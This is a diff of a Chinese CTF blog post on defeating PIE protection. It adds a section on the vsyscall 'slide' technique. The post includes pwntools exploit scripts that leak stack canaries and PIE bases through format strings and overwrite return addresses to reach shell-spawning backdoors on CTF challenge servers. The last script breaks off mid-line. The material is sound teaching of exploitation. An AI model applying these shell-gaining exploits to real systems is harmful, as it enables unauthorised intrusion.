@@ -31,22 +31,26 @@
 <meta property="og:site_name" content="D0wnBe@t">
 <meta property="og:description" content="PIE保护前言：参考：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12809?time__1311&#x3D;GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0  pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的  从ida来看，地址基本都是四位数，如下：    差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp">
-<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp">
+<meta property="og:image" content="http://downbeat.top/ida%E7%9C%8Bpie.bmp">
+<meta property="og:image" content="http://downbeat.top/checksec.bmp">
+<meta property="og:image" content="http://downbeat.top/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp">
+<meta property="og:image" content="http://downbeat.top/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp">
+<meta property="og:image" content="http://downbeat.top/ROPgadget.bmp">
+<meta property="og:image" content="http://downbeat.top/pie2-1.bmp">
+<meta property="og:image" content="http://downbeat.top/pie2-2.bmp">
+<meta property="og:image" content="http://downbeat.top/pie2-3.bmp">
+<meta property="og:image" content="http://downbeat.top/3-1.bmp">
+<meta property="og:image" content="http://downbeat.top/3-2.bmp">
+<meta property="og:image" content="http://downbeat.top/1324469efcd1c57cda1b98b358877131.png">
+<meta property="og:image" content="http://downbeat.top/capture_20241113192703897.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241113193430206.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241113193441272.bmp">
 <meta property="article:published_time" content="2024-08-31T05:06:09.000Z">
-<meta property="article:modified_time" content="2024-09-16T12:40:35.806Z">
+<meta property="article:modified_time" content="2024-11-13T11:36:48.102Z">
 <meta property="article:author" content="downbeat">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp">
+<meta name="twitter:image" content="http://downbeat.top/ida%E7%9C%8Bpie.bmp">
     
     
     <!--- Icon Part-->
@@ -237,8 +241,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-16 20:40:35</span>
-            <span class="mobile">2024-09-16 20:40:35</span>
+            <span class="desktop">2024-11-13 19:36:48</span>
+            <span class="mobile">2024-11-13 19:36:48</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -260,12 +264,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.5k 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.6k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>11 分钟</span>
         </span>
     
     
@@ -284,12 +288,12 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>参考：<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+            <h1 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h1><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>参考：<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><font size="4" color="red">pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的</font></p>
 <ul>
 <li>从ida来看，地址基本都是<strong>四位数</strong>，如下：</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../ida%E7%9C%8Bpie.bmp"></p>
 <ul>
 <li>差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给出来的只是偏移地址。</li>
 </ul>
@@ -297,7 +301,7 @@
 <ul>
 <li><fron color="red">注意：即使开启了pie，真实地址和ida中所看到的偏移地址的末三位数字肯定还是一样的，这是由于内存页对其的原理。</fron></li>
 </ul>
-<h3 id="关于开启pie的gdb调试"><a href="#关于开启pie的gdb调试" class="headerlink" title="关于开启pie的gdb调试"></a>关于开启pie的gdb调试</h3><ul>
+<h2 id="关于开启pie的gdb调试"><a href="#关于开启pie的gdb调试" class="headerlink" title="关于开启pie的gdb调试"></a>关于开启pie的gdb调试</h2><ul>
 <li><strong>指令</strong>：</li>
 </ul>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(偏移地址) <span class="comment"># 偏移地址从ida看</span></span><br></pre></td></tr></table></figure></div>
@@ -305,12 +309,12 @@
 <ul>
 <li>注意程序要先run起来，才可以打断点</li>
 </ul>
-<h3 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h3><h3 id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/774">题目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp"></p>
+<h1 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h1><h2 id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/774">题目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../checksec.bmp"></p>
 <ul>
 <li><strong>保护全开直接看ida</strong></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p>
 <ul>
 <li><strong>很明显的格式化字符串漏洞，先泄露canary和pie基地址，然后栈溢出到后门函数就可以了</strong> (此题有后门函数)</li>
 </ul>
@@ -318,18 +322,18 @@
 <ul>
 <li>在格式化字符串漏洞那里下断点：</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p>
 <ul>
 <li>先让程序start，然后如上面下断点，查看栈结构</li>
 <li><strong>rbp上方的就是canary</strong>, 距离rsp偏移是11，看最左侧也可以看出来，0xb，再加上6个寄存器(64位),偏移地址是17</li>
 <li>如何泄露pie地址，我们要得到一个<strong>既可以在ida中可以查看偏移的地址，也可以泄露出其真实地址的地方</strong>， 正如下方,偏移位0x146f的地方,泄露这个地方的地址，减去0x146f，就可以得到pie的基地址了。</li>
 <li><font color="red">注意：ROPgadget看到的地址也只是偏移地址，要加上pie的基地址后才可以使用：</font></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../ROPgadget.bmp"></p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露canary和pie基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出getflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<h6 id><a href="#" class="headerlink" title></a></h6><h3 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h3><p><a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp"></p>
+<h6 id><a href="#" class="headerlink" title></a></h6><h2 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h2><p><a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../pie2-1.bmp"></p>
 <ul>
 <li><strong>通过printf遇到\x00才会停止输出的特性，从而泄露canary</strong></li>
 <li><font color="red">但是此时无法泄露出pie的基地址了，那么我们就无法修改ret_address了吗？其实不然</font></li>
@@ -339,19 +343,19 @@
 <li>此题目就是如此，但是只需要修改末两位就可以getshell</li>
 </ul>
 <p><font size="4"><strong>gdb 调试，画框部分其实就是main函数结束后的返回地址，发现偏移是0xa6a</strong></font></p>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../pie2-2.bmp"></p>
 <p><strong><font size="4">ida中system(“&#x2F;bin&#x2F;sh”)的地址偏移是0xa42，只有后两位不同，修改后两位即可</font></strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../pie2-3.bmp"></p>
 <h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>如果有多位不同，而我们又只能逐字节更改，有时就需要自己写脚本爆破了</p>
-<h3 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.basectf.fun/">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp"></p>
+<h2 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.basectf.fun/">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../3-1.bmp"></p>
 <ul>
 <li>发现主函数就这些，什么都没有，所以我们要泄露libc，获得system函数,所需的gadget。</li>
 <li>但是我们无法像基本的ret2libc一样ret到main函数，那么如何修改呢？看下面的调试：</li>
 </ul>
-<h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp"></p>
+<h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img lazyload src="/images/loading.svg" data-src="/../3-2.bmp"></p>
 <ul>
 <li>如图，返回地址是__libc_start_main+128，按照之前的方法来说，这里应该是一个pie+偏移的地址，我们修改末两字节就可以返回到main函数，然后通过泄露的地址计算出pie基地址，进行其他操作。</li>
 <li>但是这里不是，但是难道就不行了吗？其实不然，__libc_start_main函数附近也有gadget可以使我们返回main函数，可以自己用telescope去慢慢找，但是也可以直接爆破。</li>
@@ -363,6 +367,71 @@
 <li>效果：在出现输出停止的时候就说明那个数字是有效的，因为此时你已经远程控制服务器了，等待着你输出指令。</li>
 <li>0xc0对应的是__libc_start_main的地址。</li>
 <li>题目中没有相应的gadget,但是libc.so文件里面也有gadget，通过libc_base+偏移也可以使用</li>
+</ul>
+<h1 id="vsyscall绕过"><a href="#vsyscall绕过" class="headerlink" title="vsyscall绕过"></a>vsyscall绕过</h1><p>参考文章:<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/FUCKING12/article/details/127395040">vsyscall滑梯 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>在开启PIE的情况下，如果我们没法<code>泄露pie</code>我们该怎么办呢？这里介绍一下新的东西：<code>vsyscall</code></li>
+<li><del>引自gpt</del></li>
+</ul>
+<blockquote>
+<p><code>vsyscall</code> 是 Linux 内核中用于实现某些系统调用的一种机制。它提供了一种非常高效的方式来执行系统调用，主要用于优化一些常见的系统调用的性能。为了更好地理解 <code>vsyscall</code>，我们需要从 Linux 系统调用的实现和优化角度来探讨。</p>
+<h3 id="系统调用简介"><a href="#系统调用简介" class="headerlink" title="系统调用简介"></a>系统调用简介</h3><p>在 Linux 中，用户程序通过系统调用（system call）来请求内核服务。正常的系统调用过程通常涉及用户空间与内核空间之间的上下文切换。每当用户程序需要进行系统调用时，它会触发一个软件中断（如 <code>int 0x80</code> 或 <code>syscall</code> 指令），从而进入内核态。</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/../1324469efcd1c57cda1b98b358877131.png" alt="这就是那四个函数"></p>
+<ul>
+<li>这三部分就是vsyscall的函数的调用了，运用syscall进行内核请求，最后ret</li>
+<li>主要分为下面三种操作</li>
+</ul>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (vsyscall_nr) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		<span class="comment">/* this decodes regs-&gt;di and regs-&gt;si on its own */</span></span><br><span class="line">		ret = __x64_sys_gettimeofday(regs);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="comment">/* this decodes regs-&gt;di on its own */</span></span><br><span class="line">		ret = __x64_sys_time(regs);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="comment">/* while we could clobber regs-&gt;dx, we didn&#x27;t in the past... */</span></span><br><span class="line">		orig_dx = regs-&gt;dx;</span><br><span class="line">		regs-&gt;dx = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/* this decodes regs-&gt;di, regs-&gt;si and regs-&gt;dx on its own */</span></span><br><span class="line">		ret = __x64_sys_getcpu(regs);</span><br><span class="line">		regs-&gt;dx = orig_dx;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<ul>
+<li><mark>vsyscall的地址是不会变的，通常是<code>0xffffffffff600000</code><mark></mark></mark></li>
+<li>也就是说我们也可以将<code>vsyscall</code>当作<code>ret</code>来运用，即<code>vsyscall滑梯</code></li>
+</ul>
+<h2 id="2024DSBCTF-ctfshow"><a href="#2024DSBCTF-ctfshow" class="headerlink" title="2024DSBCTF(ctfshow)"></a>2024DSBCTF(ctfshow)</h2><p>题目链接：<a class="link" target="_blank" rel="noopener" href="https://ctf.show/challenges#CheckIn-4486">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>main函数，很简单，虽然没有溢出，但是有个jmp,直接看汇编</li>
+</ul>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setinit(a1, a2, a3);</span><br><span class="line">  logo();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hack me!\n&quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xFF</span>uLL);</span><br><span class="line">  __asm &#123; jmp     qword ptr [rax] &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>很简单，只要我们修改<code>rbp+buf-0x40</code>的值为后门函数，那么就可以jmp到后门函数getshell了</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000009EB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000009F2                 add     rax, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00000000000009F6                 jmp     qword ptr [rax]</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>后门函数：</li>
+</ul>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_A13</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wtf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">7uLL</span>);</span><br><span class="line">  buf[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  system(buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<ul>
+<li>但是真这么简单吗？checksec 看看</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RUNPATH:  b<span class="string">&#x27;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>可以发现开启了PIE，我们无法直接jmp到后门函数，同时也无法泄露PIE，但是我们可以用vsyscall滑梯啊，虽然不能直接jmp到后门函数，但是可以ret到后门函数的地方执行</li>
+</ul>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>随便发个东西下断点：</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113192703897.bmp"></p>
+<ul>
+<li>可以发现我们一直ret到rbp上方四个机器字长的时候，将该地址末字节改为<code>\x13</code>即可进入到后门函数</li>
+</ul>
+<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span 